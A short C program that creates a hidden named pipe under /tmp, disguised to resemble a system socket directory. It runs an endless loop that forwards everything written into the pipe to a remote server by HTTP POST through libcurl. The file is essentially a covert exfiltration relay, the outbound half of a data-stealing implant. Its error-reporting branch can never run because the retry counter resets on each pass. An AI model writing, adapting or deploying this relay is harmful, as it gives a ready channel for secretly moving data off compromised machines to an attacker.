#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <curl/curl.h>

#define FIFO_PATH "/tmp/.1CE-UNIX"
#define SERVER "[ip]:8008"
#define BUF_SIZE 4096

int main() {
    int fifo_fd;
    char buf[BUF_SIZE];
    ssize_t n;

    // Make FIFO if it doesn't exist
    mkfifo(FIFO_PATH, 0666);
	
    // init libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    
    // set options
    curl_easy_setopt(curl, CURLOPT_URL, SERVER);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);


    for (;;) {
        // open FIFO for reading (blocks until a writer opens it)
        fifo_fd = open(FIFO_PATH, O_RDONLY);

	//if fifo breaks 
	int count = 0;
	if (fifo_fd < 0) {
	    if (count > 10){
		    const char *fifoerr = "FIFO broken";
	            curl_easy_setopt(curl,CURLOPT_POSTFIELDS, fifoerr);
		    CURLcode res = curl_easy_perform(curl);
		    (void)res;
		    curl_easy_cleanup(curl);
		    curl_global_cleanup();
		    close(fifo_fd);
		    return 0;
	    }

            sleep(1);
	    count ++;
            continue;
        }

        //read loop: read until writer closes (read returns 0)
        while ((n = read(fifo_fd, buf, sizeof(buf)-1)) > 0) {
            buf[n] = '\0';

            // trim final newline if present
            if (n > 0 && buf[n-1] == '\n') buf[n-1] = '\0';

            // attach the data as POST body
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

            // perform the HTTP request 
            CURLcode res = curl_easy_perform(curl);
            (void)res; // minimal handling: ignore result
        }

        close(fifo_fd); //  writer closed the fifo; loop will re-open and wait for next writer
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}

